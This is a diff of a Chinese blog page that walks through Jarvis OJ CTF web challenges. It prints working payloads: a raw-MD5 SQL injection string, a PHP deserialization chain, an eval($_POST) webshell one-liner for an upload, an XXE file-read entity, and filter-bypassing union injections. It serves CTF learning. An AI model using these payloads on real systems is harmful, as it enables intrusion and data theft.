@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3.3k</span>阅读时长: <span class="post-count reading-time">18 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -402,11 +402,13 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <h2 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo curl --local-port 51 http://web.jarvisoj.com:32770/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 100&lt;/title&gt;</span><br><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background:gray;</span><br><span class="line">		text-align:center;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h3&gt;Yeah!! Here's your flag:PCTF&#123;&#125;&lt;/h3&gt;	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
 <h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><blockquote>
 <p>md5</p>
 </blockquote>
 <p>header 头里面发现 hint: “select * from `admin` where password=’”.md5($pass,true).”‘“</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = <span class="keyword">FALSE</span> ] ) : string</span><br><span class="line"><span class="comment">// raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</span></span><br></pre></td></tr></table></figure>
+
 <p>搜索一下，发现有个牛逼的字符串： <code>ffifdyop</code></p>
 <p><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="noopener">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p>
 <p><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">http://www.am0s.com/functions/204.html</a></p>
@@ -417,8 +419,10 @@ height:50vh;
 </blockquote>
 <p>通过 <code>/showimg.php?img=c2hvd2ltZy5waHA=</code> 可读取源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// showing.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> </span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span>	&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// shield.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>构造利用的 <code>pop</code> 链即可，<strong>payload</strong></p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"file"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
 <h2 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h2><blockquote>
 <p>有反引号的注入</p>
 </blockquote>
@@ -438,7 +442,7 @@ height:50vh;
 <p>图片只能上传 jpg ，所以直接抓包在后面再个一句话，然后用 fopen() 去包含</p>
 <p>但是，注意是但是，这里有个坑，不能用 &lt;?php，有 waf，要用 <script language="php">eval($_POST[1])</script></p>
 <p>然后 page=uploads/1552805580.jpg%00 自动出 flag，都不需要菜刀</p>
-<p>这题出的太过死板，&lt;?=?&gt; 是可以的，居然没任何回显，专考 <script language="php"> 标签了，没意义</p>
+<p>这题出的太过死板，<?=?> 是可以的，居然没任何回显，专考 <script language="php"> 标签了，没意义</p>
 <p>有时间自己改一改出个题</p>
 <h2 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h2><blockquote>
 <p> xxe 入门</p>
@@ -448,24 +452,27 @@ height:50vh;
 <p>常规系统里对接收的请求都会做限制，比如POST之以content-type的application/x-www-form-urlencoded接收，但在一些框架系统里，框架会自动帮开发者识别传入的数据</p>
 <p> POST 提交数据的四种常见方式</p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">application</span>/x-www-form-urlencoded </span><br><span class="line">multipart/form-data</span><br><span class="line"><span class="built_in">application</span>/json</span><br><span class="line"><span class="built_in">application</span>/xml</span><br></pre></td></tr></table></figure>
+
 <p>比如：默认为application/x-www-form-urlencoded接收的我只需修改为 application/json</p>
 <p>即可传入JSON格式的数据，XML同理</p>
-<p>这将导致原本不存在xml解析的地方可能存在XXE漏洞<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">var</span> xhr;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">return</span> xhr;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​    evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">var</span> xhr = XHR();</span><br><span class="line"></span><br><span class="line">​        xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line"></span><br><span class="line">​                data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line"></span><br><span class="line">​                tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line"></span><br><span class="line">​                tip_area.value = data.task.search+data.task.value;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;;</span><br><span class="line"></span><br><span class="line">​        xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这将导致原本不存在xml解析的地方可能存在XXE漏洞</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">var</span> xhr;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line"></span><br><span class="line">​                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">return</span> xhr;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​    evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">var</span> xhr = XHR();</span><br><span class="line"></span><br><span class="line">​        xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">​            <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line"></span><br><span class="line">​                data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line"></span><br><span class="line">​                tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line"></span><br><span class="line">​                tip_area.value = data.task.search+data.task.value;</span><br><span class="line"></span><br><span class="line">​            &#125;</span><br><span class="line"></span><br><span class="line">​        &#125;;</span><br><span class="line"></span><br><span class="line">​        xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line"></span><br><span class="line">​        xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>
+
 <p>payload:</p>
 <p>Content-Type: application/xml</p>
-<p>​    &lt;?xml version=”1.0” encoding=”utf-8”?&gt;</p>
-<p>​    &lt;!DOCTYPE data[</p>
-<p>​    &lt;!ENTITY file SYSTEM “file:////home/ctf/flag.txt”&gt;</p>
-<p>]&gt;</p>
+<p>​    <?xml version="1.0" encoding="utf-8"?></p>
+<p>​    <!DOCTYPE data[</p>
+<p>​    <!ENTITY file SYSTEM "file:////home/ctf/flag.txt"></p>
+<p>]></p>
 <p><data>&file;</data></p>
-<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>​    header 头里面发现 hint: “select * from <code>admin</code> where password=’”.md5($pass,true).”‘“</p>
+<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>​    header 头里面发现 hint: "select * from <code>admin</code> where password='".md5($pass,true)."'"</p>
 <p>​    md5 ( string $str [, bool $raw_output = FALSE ] ) : string</p>
 <p>​    string 要计算的字符串 </p>
 <p>​    raw 为 TRUE 时为 16 字符二进制格式，默认为 false 32 字符十六进制数</p>
 <p>​    参考 <a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p>
 <p>​        <a href="http://www.am0s.com/functions/204.html">http://www.am0s.com/functions/204.html</a></p>
 <p>​    有个牛逼的字符串： ffifdyop</p>
-<p>​    传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=’’or’6�]��!r,��b’</p>
+<p>​    传入之后，最终的 sql 语句变为 select * from <code>admin</code> where password=''or'6�]��!r,��b'</p>
 <p>​    成功闭合，得到万能密码</p>
 <h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>​    咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</p>
 <p>​    题目给了个 udf.so 的文件，IDA 启动，然而并没有发现啥东西（汇编还要加油</p>
@@ -473,84 +480,84 @@ height:50vh;
 <p>​    <a href="http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/">http://vinc.top/2017/04/19/mysql-udf%E6%8F%90%E6%9D%83linux%E5%B9%B3%E5%8F%B0/</a></p>
 <p>​    </p>
 <p>​    将 udf.so 导入到MySQL的插件里面，注意改下权限</p>
-<p>​    mysql&gt; show variables like “%plugin%”;</p>
-<p>​    +——————————-+————————+</p>
+<p>​    mysql> show variables like "%plugin%";</p>
+<p>​    +-------------------------------+------------------------+</p>
 <p>​    | Variable_name                 | Value                  |</p>
-<p>​    +——————————-+————————+</p>
+<p>​    +-------------------------------+------------------------+</p>
 <p>​    | default_authentication_plugin | mysql_native_password  |</p>
 <p>​    | plugin_dir                    | /usr/lib/mysql/plugin/ |</p>
-<p>​    +——————————-+————————+</p>
+<p>​    +-------------------------------+------------------------+</p>
 <p>​    2 rows in set (0.00 sec)</p>
-<p>​    mysql&gt; create function help_me returns string soname ‘udf.so’;</p>
+<p>​    mysql> create function help_me returns string soname 'udf.so';</p>
 <p>​    Query OK, 0 rows affected (0.00 sec)</p>
-<p>​    mysql&gt; select help_me();</p>
-<p>​    +———————————————+</p>
+<p>​    mysql> select help_me();</p>
+<p>​    +---------------------------------------------+</p>
 <p>​    | help_me()                                   |</p>
-<p>​    +———————————————+</p>
+<p>​    +---------------------------------------------+</p>
 <p>​    | use getflag function to obtain your flag!!  |</p>
-<p>​    +———————————————+</p>
+<p>​    +---------------------------------------------+</p>
 <p>​    1 row in set (0.00 sec)</p>
-<p>​    mysql&gt; create function getflag returns string soname ‘udf.so’;</p>
+<p>​    mysql> create function getflag returns string soname 'udf.so';</p>
 <p>​    Query OK, 0 rows affected (0.00 sec)</p>
-<p>​    mysql&gt; select getflag();</p>
-<p>​    +——————————————+</p>
+<p>​    mysql> select getflag();</p>
+<p>​    +------------------------------------------+</p>
 <p>​    | getflag()                                |</p>
-<p>​    +——————————————+</p>
+<p>​    +------------------------------------------+</p>
 <p>​    | PCTF{Interesting_U5er_d3fined_Function}  |</p>
-<p>​    +——————————————+</p>
+<p>​    +------------------------------------------+</p>
 <p>​    1 row in set (0.00 sec)</p>
 <h2 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h2><p>​    然而又是 hash 扩展攻击，不做了</p>
-<p>​    &lt;?php </p>
+<p>​    <?php </p>
 <p>​    $auth = false;</p>
-<p>​    $role = “guest”;</p>
-<p>​    $salt = ‘32342’;</p>
-<p>​    if (isset($_COOKIE[“role”])) {</p>
-<p>​        $role = unserialize($_COOKIE[“role”]);</p>
-<p>​        $hsh = $_COOKIE[“hsh”];</p>
-<p>​        if ($role===”admin” &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[“role”]))) {</p>
+<p>​    $role = "guest";</p>
+<p>​    $salt = '32342';</p>
+<p>​    if (isset($_COOKIE["role"])) {</p>
+<p>​        $role = unserialize($_COOKIE["role"]);</p>
+<p>​        $hsh = $_COOKIE["hsh"];</p>
+<p>​        if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {</p>
 <p>​            $auth = true;</p>
 <p>​        } else {</p>
 <p>​            $auth = false;</p>
 <p>​        }</p>
 <p>​    } else {</p>
 <p>​        $s = serialize($role);</p>
-<p>​        setcookie(‘role’,$s);</p>
+<p>​        setcookie('role',$s);</p>
 <p>​        $hsh = md5($salt.strrev($s));</p>
-<p>​        setcookie(‘hsh’,$hsh);</p>
+<p>​        setcookie('hsh',$hsh);</p>
 <p>​    }</p>
 <p>​    if ($auth) {</p>
-<p>​        echo “<h3>Welcome Admin. Your flag is “;</p>
+<p>​        echo "<h3>Welcome Admin. Your flag is ";</p>
 <p>​    } else {</p>
-<p>​        echo “<h3>Only Admin can see the flag!!</h3>“;</p>
+<p>​        echo "<h3>Only Admin can see the flag!!</h3>";</p>
 <p>​    }</p>
-<p>​    ?&gt; </p>
-<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>​    &lt;?php</p>
+<p>​    ?> </p>
+<h2 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h2><p>​    <?php</p>
 <p>​        error_reporting(0);</p>
-<p>​        echo “<!--index.phps-->“;</p>
-<p>​        if(!$_GET[‘id’]) {</p>
-<p>​            header(‘Location: index.php?id=1’);</p>
+<p>​        echo "<!--index.phps-->";</p>
+<p>​        if(!$_GET['id']) {</p>
+<p>​            header('Location: index.php?id=1');</p>
 <p>​            exit();</p>
 <p>​        }</p>
-<p>​        $id=$_GET[‘id’];</p>
-<p>​        $a=$_GET[‘a’];</p>
-<p>​        $b=$_GET[‘b’];</p>
-<p>​        if(stripos($a,’.’)) {</p>
-<p>​            echo ‘Hahahahahaha’;</p>
+<p>​        $id=$_GET['id'];</p>
+<p>​        $a=$_GET['a'];</p>
+<p>​        $b=$_GET['b'];</p>
+<p>​        if(stripos($a,'.')) {</p>
+<p>​            echo 'Hahahahahaha';</p>
 <p>​            return ;</p>
 <p>​        }</p>
-<p>​        $data = @file_get_contents($a,’r’);</p>
-<p>​        if($data==”1112 is a nice lab!” and $id==0 and strlen($b)&gt;5 </p>
-<p>​        and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4) {</p>
-<p>​            require(“flag.txt”);</p>
+<p>​        $data = @file_get_contents($a,'r');</p>
+<p>​        if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 </p>
+<p>​        and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) {</p>
+<p>​            require("flag.txt");</p>
 <p>​        }</p>
 <p>​        else {</p>
-<p>​            print “work harder!harder!harder!”;</p>
+<p>​            print "work harder!harder!harder!";</p>
 <p>​        }</p>
-<p>​    ?&gt;</p>
-<p>​    payload1: index.php/?id=a&amp;a=php://input&amp;b=%0034253</p>
+<p>​    ?></p>
+<p>​    payload1: index.php/?id=a&a=php://input&b=%0034253</p>
 <p>​    post: 1112 is a nice lab!</p>
 <p>​    eregi() 会被 %00 截断，但 strlen() 不会</p>
-<p>​    ==&gt;  <!--index.phps-->�Come ON!!! {/^HT2mCpcvOLf}</p>
+<p>​    ==>  <!--index.phps-->�Come ON!!! {/^HT2mCpcvOLf}</p>
 <p>​    进入该目录，自动跳转到 web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1</p>
 <p>​    </p>
 <p>​    发现空格被过滤，尝试绕过</p>
@@ -565,36 +572,36 @@ height:50vh;
 <p>​    payload2: </p>
 <p>​    获取所有数据库名</p>
 <p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(schema_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.schemata%23</p>
-<p>​    ==&gt; information_schema,test</p>
+<p>​    ==> information_schema,test</p>
 <p>​    获取本数据库内的所有表名</p>
 <p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(table_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.tables/<em>233</em>/where/<em>233</em>/table_schema=database()%23</p>
-<p>​    ==&gt; content</p>
+<p>​    ==> content</p>
 <p>​    （以上两步可省略）</p>
 <p>​    获取所有字段名</p>
 <p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(column_name)/<em>233</em>/frfromom/<em>233</em>/information_schema.columns/<em>233</em>/where/<em>233</em>/table_name=0x636f6e74656e74%23</p>
-<p>​    ==&gt; id,context,title</p>
+<p>​    ==> id,context,title</p>
 <p>​    获取所有数据</p>
 <p>​    ?id=2/<em>233</em>/uniounionn/<em>233</em>/selselectect/<em>233</em>/1,2,group_concat(id,context,title)/<em>233</em>/frfromom/<em>233</em>/content%23</p>
-<p>​    ==&gt; 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666</p>
+<p>​    ==> 1PCTF{Fin4lly_U_got_i7_C0ngRatulation5}hi666</p>
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>​    是一个输入框，输入密码，显示密码错误</p>
 <p>​    扫不到其他目录，看看源码，有个 app.js </p>
 <p>​    搜索 Wrong Password!!</p>
-<p>​    $.post(“checkpass.json”, t,</p>
+<p>​    $.post("checkpass.json", t,</p>
 <p>​    function(t) {</p>
 <p>​        self.checkpass(e) ? self.setState({</p>
-<p>​            errmsg: “Success!!”,</p>
+<p>​            errmsg: "Success!!",</p>
 <p>​            errcolor: b.green400</p>
 <p>​        }) : (self.setState({</p>
-<p>​            errmsg: “Wrong Password!!”</p>
-<p>​            ……</p>
+<p>​            errmsg: "Wrong Password!!"</p>
+<p>​            ......</p>
 <p>​        }))</p>
 <p>​    })</p>
 <p>​    跟进去</p>
 <p>​    function(e) {</p>
 <p>​        if (25 !== e.length) return ! 1;</p>
-<p>​        for (var t = [], n = 0; n &lt; 25; n++) t.push(e.charCodeAt(n));</p>
-<p>​        for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 